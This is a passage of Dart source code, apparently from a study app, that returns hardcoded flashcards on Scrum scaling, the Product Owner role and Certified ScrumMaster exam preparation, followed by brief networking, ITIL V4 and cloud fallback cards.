          'definition':
              '1) Product Backlog is ORDERED, not prioritised. 2) Refinement is ongoing — not an official event. 3) Only Developers change the Sprint Backlog. 4) Increment must meet DoD to be an Increment. 5) DoD is the floor for all items; AC defines specific item behaviour. 6) User stories are NOT a Scrum requirement.',
          'example':
              'Quick-fire: Who owns the Sprint Backlog? (Developers). Who owns the Product Backlog? (Product Owner). What must every Increment meet? (Definition of Done). What is the Product Backlog commitment? (Product Goal). Can the PO change a Developer\'s estimate? (No).',
        },
      ];

    // ── Module 06: Scaling Scrum & Advanced Topics ────────────────────────
    case 'module-06':
      return [
        {
          'label': 'Scaling',
          'term': 'Why Scaling Frameworks Exist',
          'definition':
              'Standard Scrum is designed for a single team of up to ~10 people. When products require multiple teams working in parallel, coordination challenges emerge: how to align backlogs, synchronise releases, and manage dependencies. Scaling frameworks extend Scrum to handle these challenges.',
          'example':
              'A bank building a new digital platform needs 8 Scrum Teams working simultaneously. Without a scaling approach, teams will duplicate work, create conflicting changes, and miss integration points. Scaling frameworks provide coordination structures while preserving team autonomy.',
        },
        {
          'label': 'Scaling',
          'term': 'SAFe — Scaled Agile Framework',
          'definition':
              'SAFe organises multiple Agile teams around Agile Release Trains (ARTs) — groups of 50–125 people working toward a common Program Increment (PI). PI Planning is a large-scale event where all teams align for the next 8–12 weeks. SAFe is the most widely adopted enterprise scaling framework.',
          'example':
              'Exam context: SAFe introduces roles like Release Train Engineer (RTE — similar to Scrum Master at ART level), Product Manager (similar to PO at programme level), and System Architect. SAFe preserves individual Scrum Teams at the team level while adding coordination layers above.',
        },
        {
          'label': 'Scaling',
          'term': 'LeSS — Large-Scale Scrum',
          'definition':
              'LeSS applies Scrum directly to multiple teams with minimal additional roles and ceremonies. All teams work from a single Product Backlog managed by one Product Owner. LeSS prioritises simplicity and organisational restructuring over adding new roles and processes.',
          'example':
              'LeSS Basic: 2–8 teams, one Product Owner, one Product Backlog, shared Sprint cycle. LeSS Huge: 8+ teams, adds Area Product Owners per area. LeSS philosophy: "More with LeSS" — add less process, restructure the organisation instead.',
        },
        {
          'label': 'Scaling',
          'term': 'Nexus Framework',
          'definition':
              'Nexus is Scrum.org\'s official scaling framework, designed for 3–9 Scrum Teams working on a single Product Backlog. It adds a Nexus Integration Team responsible for technical integration and coordination. Nexus preserves all Scrum events but adds cross-team coordination layers.',
          'example':
              'Nexus adds: Nexus Sprint Planning (cross-team dependency identification), Nexus Daily Scrum (integration issues), Nexus Sprint Review (one integrated Increment), Nexus Sprint Retrospective (cross-team improvement). Each team still runs its own Scrum events in addition.',
        },
        {
          'label': 'Scaling',
          'term': 'Comparing SAFe, LeSS, and Nexus',
          'definition':
              'SAFe: most structured, adds many roles and events, suited for large enterprises. LeSS: minimal additional structure, requires organisational redesign, suited for organisations willing to simplify. Nexus: Scrum-native, moderate structure, best for 3–9 teams on one product.',
          'example':
              'Choosing a framework depends on scale, culture, and appetite for change. SAFe fits hierarchical enterprises that want structure. LeSS fits flat organisations willing to restructure. Nexus fits teams wanting to scale without departing far from pure Scrum.',
        },
        {
          'label': 'Advanced topic',
          'term': 'Kanban and Scrum — How They Relate',
          'definition':
              'Kanban is a flow-based method focused on visualising work, limiting Work in Progress (WIP), and continuously improving flow. Scrum and Kanban can be combined — often called "Scrumban." Teams may use a Kanban board to manage their Sprint Backlog while keeping Scrum\'s events and accountabilities.',
          'example':
              'A Scrum Team adds WIP limits to their Sprint board. If "In Progress" is limited to 3 items, Developers cannot start new work until existing items move forward. This reduces multitasking and improves flow — a Kanban principle applied within Scrum.',
        },
        {
          'label': 'Advanced topic',
          'term': 'Technical Debt',
          'definition':
              'Technical debt is the accumulated cost of shortcuts, poor design decisions, and deferred maintenance in a codebase. It slows future development because the team must work around or fix these issues. In Scrum, technical debt undermines the ability to produce a releasable Increment every Sprint.',
          'example':
              'Scenario: A team consistently ships features without writing tests to "save time." After 6 months, every change breaks something. The cost of fixing the untested code (technical debt) now exceeds the time "saved." Scrum teams manage debt by including technical improvements in every Sprint.',
        },
        {
          'label': 'Advanced topic',
          'term': 'Velocity',
          'definition':
              'Velocity is the amount of work (typically in story points) a team completes per Sprint. It is a PLANNING tool — used by the team to forecast how much they can complete in future Sprints. Velocity should never be used as a performance metric or compared across teams.',
          'example':
              'Exam trap: Velocity is for the team\'s own planning — not for management reporting or cross-team comparison. A team with higher velocity is not necessarily more productive — they may just estimate larger. Using velocity as a KPI incentivises story point inflation.',
        },
        {
          'label': 'Advanced topic',
          'term': 'Real-World Scrum Challenges',
          'definition':
              'Common challenges include: partial adoption (using some Scrum ceremonies without the full framework), Scrum Master acting as project manager, Product Owner unavailability, teams that are not truly cross-functional, and stakeholders bypassing the PO to request work directly from Developers.',
          'example':
              'Scenario: Developers receive direct requests from stakeholders during the Sprint and start working on them without telling the PO. This violates transparency, breaks the Sprint Backlog, and undermines the Sprint Goal. The Scrum Master must address this and redirect requests through the PO.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 6 — Top Exam Traps',
          'definition':
              '1) SAFe adds the most structure; LeSS adds the least. 2) Velocity is a planning tool — not a performance metric. 3) Kanban and Scrum are compatible — Scrumban is a valid hybrid. 4) Technical debt must be managed within Sprints — not deferred indefinitely. 5) Stakeholders must work through the PO, not directly with Developers.',
          'example':
              'Scenario: "Management wants to compare velocity across three teams to find the most productive one." Violation: velocity is team-specific, not comparable across teams. "A team skips the Retrospective because they are behind." Violation: all Scrum events are required — the Retrospective cannot be skipped.',
        },
      ];

    // ── Module 07: The Product Owner Role ────────────────────────────────
    case 'module-07':
      return [
        {
          'label': 'Product Owner',
          'term': 'Product Thinking vs Feature Factory',
          'definition':
              'A "feature factory" mentality ships features without measuring whether they create value. Product thinking focuses on outcomes: what problem are we solving, for whom, and how do we know we succeeded? An effective Product Owner drives toward outcomes, not output.',
          'example':
              'Feature factory: "Ship the dashboard by Q3." Product thinking: "Reduce the time it takes for customers to understand their data by 50% by Q3. The dashboard is one possible solution — let\'s validate the hypothesis first."',
        },
        {
          'label': 'Product Owner',
          'term': 'Product Vision',
          'definition':
              'The Product Vision is a long-term, aspirational description of the product\'s purpose and direction. It serves as the North Star for all product decisions and aligns the Scrum Team and stakeholders. The Product Goal (Scrum artifact commitment) is a step toward the Product Vision.',
          'example':
              'Product Vision: "Empower every small business to manage their finances without an accountant." Product Goal (current): "Enable a self-employed user to generate a tax-ready income report in under 5 minutes." The goal is concrete and measurable; the vision is aspirational.',
        },
        {
          'label': 'Product Owner',
          'term': 'Stakeholder Management',
          'definition':
              'The Product Owner is the single point of contact for stakeholders regarding product direction. They balance competing stakeholder interests, translate business needs into Product Backlog items, and communicate product direction back to stakeholders. They must be available and decisive.',
          'example':
              'Scenario: Marketing wants a new campaign feature. Engineering wants infrastructure upgrades. Legal needs a compliance change. The PO weighs business value, risk, cost, and strategic fit — then makes a priority call. They cannot please everyone but must justify the ordering transparently.',
        },
        {
          'label': 'Product Owner',
          'term': 'Product Backlog Ordering Strategies',
          'definition':
              'POs use multiple strategies to order backlogs: Value vs effort (prioritise high value/low effort), Risk reduction (tackle uncertainty early), Dependencies (unblock other work), Stakeholder agreements (committed deliverables), and WSJF — Weighted Shortest Job First (cost of delay ÷ job duration).',
          'example':
              'WSJF: Feature A has a cost of delay of £10k/week and takes 1 week. Score = 10. Feature B has a cost of delay of £5k/week and takes 3 weeks. Score = 1.7. Feature A should be prioritised first — even though both seem important.',
        },
        {
          'label': 'Product Owner',
          'term': 'User Story Mapping',
          'definition':
              'User story mapping visualises the product as a narrative: user activities across the top (the "backbone"), tasks beneath each activity, and stories beneath tasks. It helps POs identify the minimum viable path through the product and plan releases around user journeys rather than feature lists.',
          'example':
              'Backbone: Browse products → Add to cart → Checkout → Receive delivery. Tasks under Checkout: enter address, choose payment, review order, confirm. Stories: "As a user, I can pay by card," "As a user, I can save my address." The map shows what is essential vs optional for a first release.',
        },
        {
          'label': 'Product Owner',
          'term': 'Minimum Viable Product (MVP)',
          'definition':
              'An MVP is the smallest product release that delivers value to real users and enables learning. It is not a half-built product — it is a complete solution for a narrow problem. The goal is to test assumptions with real users before investing in full development.',
          'example':
              'Dropbox\'s MVP was a demo video — no product existed yet. It validated that people wanted cloud file sync before writing a line of code. An MVP that requires 18 months to build is probably not minimum. If you cannot learn from it quickly, it is too large.',
        },
        {
          'label': 'Product Owner',
          'term': 'Acceptance Criteria Best Practices',
          'definition':
              'Strong acceptance criteria are: specific and testable, written from the user\'s perspective, agreed between PO and Developers before Sprint Planning, and do not prescribe implementation details. Behaviour-Driven Development (BDD) uses Given/When/Then format for testable criteria.',
          'example':
              'Weak AC: "Login should work." Strong AC (Given/When/Then): "Given a registered user, When they enter valid credentials, Then they are redirected to the dashboard within 2 seconds." BDD format makes acceptance criteria directly testable and removes ambiguity.',
        },
        {
          'label': 'Product Owner',
          'term': 'Measuring Product Success — Outcomes and Metrics',
          'definition':
              'Effective POs measure success through outcome metrics, not output metrics. Output: features shipped, stories completed. Outcome: user retention, revenue, task completion rate, NPS. OKRs (Objectives and Key Results) are a common framework POs use to connect product work to measurable business outcomes.',
          'example':
              'Output metric: "Shipped 47 stories this quarter." Outcome metric: "Customer activation rate increased from 23% to 41%." Outcome metrics tell you whether the product is working; output metrics tell you how busy the team was. A product team should be measured on outcomes.',
        },
        {
          'label': 'Product Owner',
          'term': 'Anti-Patterns — Signs of a Struggling Product Owner',
          'definition':
              'Common PO anti-patterns: Unavailable PO (team makes decisions without input), Proxy PO (decisions filtered through middlemen), Committee PO (no single decision-maker), Backlog as task list (no user value context), and PO dictating HOW work should be done (violates Developer autonomy).',
          'example':
              'Scenario: "The PO only attends Sprint Review. Developers guess requirements between events." This is an unavailable PO — one of the most damaging anti-patterns. Developers build the wrong things, rework piles up, and value delivery collapses. The PO must be continuously available, not just at ceremonies.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 7 — Top Exam Traps',
          'definition':
              '1) PO manages outcomes, not just features. 2) PO is ONE person, always available, never a proxy or committee. 3) Backlog is ORDERED by the PO — Developers cannot change the order. 4) PO defines WHAT; Developers define HOW. 5) Sprint Goal is created collaboratively — PO cannot dictate it unilaterally.',
          'example':
              'Scenario: "The PO tells the team exactly how to implement the search feature." Violation: PO defines the WHAT (search must return results in under 1 second), not the HOW (which algorithm to use). Developers own implementation decisions. This is a boundary the CSM exam tests regularly.',
        },
      ];

    // ── Module 08: Exam Preparation ───────────────────────────────────────
    case 'module-08':
      return [
        {
          'label': 'Exam overview',
          'term': 'CSM Exam — Format and Requirements',
          'definition':
              'The Certified ScrumMaster (CSM) exam from Scrum Alliance requires: completion of a 2-day CSM course, passing a 50-question online exam, 74% pass mark (37/50 correct), 60 minutes to complete. The exam tests knowledge and application of the Scrum framework as defined in the Scrum Guide.',
          'example':
              'Strategy: You have ~72 seconds per question. Flag uncertain questions and return to them. Questions are scenario-based — eliminate obviously wrong answers first. The Scrum Guide (2020) is the authoritative reference, not any trainer\'s slides or books.',
        },
        {
          'label': 'Rapid review',
          'term': 'Three Accountabilities — Quick Reference',
          'definition':
              'Product Owner: maximises product value, owns/orders Product Backlog, one person. Scrum Master: team effectiveness, servant-leader, facilitates/coaches. Developers: create the Increment, own the Sprint Backlog, cross-functional, self-managing. Remember: PO = WHAT and WHY. Developers = HOW. SM = HOW WE WORK TOGETHER.',
          'example':
              'Test yourself: "Who decides which items go into the Sprint?" (Developers select from PO-ordered backlog during Sprint Planning — collaborative). "Who decides the order of the Product Backlog?" (Product Owner alone). "Who removes impediments?" (Scrum Master).',
        },
        {
          'label': 'Rapid review',
          'term': 'Five Events — Quick Reference',
          'definition':
              'Sprint: container, 1–4 weeks. Sprint Planning: max 8h, WHY+WHAT+HOW. Daily Scrum: 15 min, Developers only, inspect Sprint Goal progress. Sprint Review: max 4h, Scrum Team + stakeholders, inspect Increment. Sprint Retrospective: max 3h, Scrum Team only, inspect process.',
          'example':
              'Memory test: Who attends each event? Sprint Planning = Scrum Team. Daily Scrum = Developers only. Sprint Review = Scrum Team + stakeholders. Retrospective = Scrum Team only. Who facilitates each? Scrum Master facilitates Planning, Review, and Retrospective. Developers run Daily Scrum.',
        },
        {
          'label': 'Rapid review',
          'term': 'Three Artifacts + Commitments — Quick Reference',
          'definition':
              'Product Backlog → commitment: Product Goal. Sprint Backlog → commitment: Sprint Goal. Increment → commitment: Definition of Done. Who owns each? Product Backlog = Product Owner. Sprint Backlog = Developers. Increment = Scrum Team (meets DoD set by organisation/team).',
          'example':
              'Test yourself: "What must be true for work to be considered an Increment?" (Must meet DoD). "Who can add items to the Sprint Backlog during the Sprint?" (Only Developers, with PO negotiation on scope). "What is the commitment of the Product Backlog?" (Product Goal).',
        },
        {
          'label': 'Rapid review',
          'term': 'Empiricism — Three Pillars + Five Values',
          'definition':
              'Three pillars: Transparency, Inspection, Adaptation (TIA). Five values: Commitment, Focus, Openness, Respect, Courage (CFORC). Scrum works when all pillars are present and the team lives the values. Absence of any pillar or value creates dysfunction that the Scrum framework alone cannot fix.',
          'example':
              'Scenario: "The team\'s velocity data is hidden from stakeholders." Missing pillar: Transparency. "The team identifies a better approach mid-Sprint but continues with the old plan." Missing pillar: Adaptation. "A Developer knows the Sprint is at risk but says nothing." Missing value: Courage + Openness.',
        },
        {
          'label': 'Exam strategy',
          'term': 'Answering Scenario Questions — Method',
          'definition':
              'Step 1: Identify who is involved (PO, SM, Developer, stakeholder). Step 2: Identify what action is being described. Step 3: Ask: does this violate any Scrum accountability boundary? Step 4: Eliminate answers using v3-style management language. Step 5: Choose the answer most aligned with servant-leadership and empiricism.',
          'example':
              '"The Scrum Master notices the team is not following the DoD. What should they do?" Eliminate: "Enforce compliance" (too authoritarian). Eliminate: "Ignore it" (irresponsible). Correct: "Raise the issue in the Retrospective and coach the team on why DoD matters." SM coaches — does not police.',
        },
        {
          'label': 'Exam strategy',
          'term': 'Eliminating Wrong Answers — CSM Patterns',
          'definition':
              'Eliminate answers that: give the SM management authority over Developers, allow the PO to be a committee, skip or shorten Scrum events, allow stakeholders to bypass the PO, treat Scrum as optional/partial, use output metrics as success measures, or describe the SM as running the Daily Scrum.',
          'example':
              '"The Project Manager reviews each Developer\'s work daily and assigns new tasks." Multiple violations: Scrum has no Project Manager role; task assignment is done by Developers; this is command-and-control, not self-management. Any answer describing this positively is wrong.',
        },
        {
          'label': 'Common mistakes',
          'term': 'Top 10 Reasons Candidates Fail the CSM Exam',
          'definition':
              '1) Confusing Sprint Review and Retrospective. 2) Thinking SM manages the team. 3) Saying velocity is a performance metric. 4) Forgetting DoD is the Increment\'s commitment. 5) Missing that only Developers own Sprint Backlog. 6) Thinking PO can dictate HOW. 7) Forgetting Sprint Goal is fixed; scope flexes. 8) Allowing stakeholders in the Retrospective. 9) Thinking refinement is a formal Scrum event. 10) Using old (pre-2020) Scrum Guide terminology.',
          'example':
              'Review this list before your exam. Each item represents a direct exam question type. If you can explain WHY each is wrong — not just that it is wrong — you have the depth of understanding the CSM exam tests.',
        },
        {
          'label': 'Rapid review',
          'term': 'Full Scrum Framework — One Card Summary',
          'definition':
              'Accountabilities (3): PO, SM, Developers. Events (5): Sprint, Sprint Planning, Daily Scrum, Sprint Review, Sprint Retrospective. Artifacts (3): Product Backlog (Goal), Sprint Backlog (Sprint Goal), Increment (DoD). Pillars (3): TIA. Values (5): CFORC. Theory: empiricism + lean thinking. Guide: 2020 Scrum Guide.',
          'example':
              'Use this as your 2-minute pre-exam review. Every number on this card can be tested. If you can recite all accountabilities, events, artifacts, and their commitments from memory, you have the structural knowledge to pass. Scenario questions test whether you can APPLY this structure.',
        },
        {
          'label': 'Exam prep',
          'term': 'Last 24 Hours Before the CSM Exam — Checklist',
          'definition':
              'DO: Review the 2020 Scrum Guide (it\'s only 13 pages — read it once). Review all three accountabilities and their boundaries. Review all five events, their purposes, and who attends. Review all three artifacts and their commitments. DO NOT: memorise trainer slides that contradict the Scrum Guide. The Guide is the exam\'s authoritative source.',
          'example':
              'Night before: use these flashcards for a 50-question timed self-test. Target 85%+ for confidence. If below 75%, focus on: accountability boundaries (who can do what), artifact ownership, and event purposes. These three areas account for the majority of exam questions.',
        },
      ];

    default:
      return [
        {
          'label': 'Definition',
          'term': 'What is Scrum?',
          'definition':
              'Scrum is a lightweight framework for developing complex products using short iterations called Sprints. It defines three accountabilities, five events, and three artifacts.',
          'example':
              'A software team works in 2-week sprints, delivering a working feature increment at the end of each sprint.',
        },
      ];
  }
}

    // ── Default networking fallback ────────────────────────────────────────
    return [
      {
        'label': 'Definition',
        'term': 'What is a Network?',
        'definition':
            'A network is a collection of computers, servers, and other devices connected together to share resources and communicate.',
        'example':
            'Your home WiFi connects your phone, laptop, and TV — that is a local area network (LAN).',
      },
      {
        'label': 'Core concept',
        'term': 'IP Address',
        'definition':
            'An IP address is a unique numerical label assigned to each device connected to a network. It identifies the device and its location.',
        'example':
            'Your computer IP might be 192.168.1.5 on your home network.',
      },
      {
        'label': 'Core concept',
        'term': 'DNS',
        'definition':
            'DNS translates human-readable domain names like google.com into IP addresses that computers use to identify each other.',
        'example':
            'When you type google.com, DNS translates it to an IP like 142.250.80.46.',
      },
      {
        'label': 'Core concept',
        'term': 'TCP/IP',
        'definition':
            'TCP/IP is the foundational communication protocol of the internet. TCP handles data packaging and delivery confirmation, while IP handles addressing and routing.',
        'example':
            'When you send an email, TCP breaks it into packets, IP routes them, and TCP confirms they all arrived.',
      },
      {
        'label': 'Key term',
        'term': 'Router',
        'definition':
            'A router forwards data packets between networks. It directs internet traffic and connects your local network to the internet.',
        'example':
            'The box your ISP gave you is a router — it connects your home devices to the internet.',
      },
    ];
  }

  // ── Fallback defaults ──────────────────────────────────────────────────────
  List<Map<String, String>> _itilV4Default() => [
        {
          'label': 'Definition',
          'term': 'What is ITIL V4?',
          'definition':
              'ITIL V4 is a framework of best practices for IT Service Management (ITSM). It provides guidance on designing, delivering, and improving IT services to create value for organisations and their customers.',
          'example':
              'Exam trap: ITIL V4 is guidance — not a mandatory standard. Organisations adopt and adapt it to their context.',
        },
      ];

  List<Map<String, String>> _cloudFundamentalsDefault() => [
        {
          'label': 'Definition',
          'term': 'What is cloud computing?',
          'definition':
              'Cloud computing delivers computing services over the internet — servers, storage, databases, and software — on a pay-as-you-go basis.',
          'example':
              'Instead of buying a server, you rent one from AWS and pay only for the hours you use.',
        },
      ];

  List<Map<String, String>> _cloudProDefault() => [
        {
          'label': 'Architecture',
          'term': 'Well-Architected Framework',
          'definition':
              'A set of best practices across six pillars: Operational Excellence, Security, Reliability, Performance Efficiency, Cost Optimisation, and Sustainability.',
          'example':
              'Before launching, an architect reviews each pillar to ensure the design is secure, resilient, and cost-effective.',
        },
      ];
}